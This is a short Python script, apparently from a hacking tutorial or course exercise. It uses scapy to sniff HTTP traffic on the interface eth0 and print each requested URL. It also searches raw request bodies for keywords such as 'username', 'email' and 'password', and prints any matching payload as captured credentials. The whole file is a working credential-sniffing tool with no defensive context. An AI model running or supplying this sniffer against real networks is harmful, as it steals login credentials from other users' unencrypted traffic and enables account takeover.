#!usr/bin/env python3
import scapy.all as scap
from scapy.layers import http


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scap.Raw):
        load = packet[scap.Raw].load
        keywords = ["username", "email", "user", "login", "password", "pass"]
        for keyword in keywords:
            if bytes(keyword, "utf-8") in load:
                return load


def sniff(interface):
    scap.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("HTTP Request >>" + str(url))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\nUsername and Password: " + str(login_info) + "\n\n")


sniff("eth0")
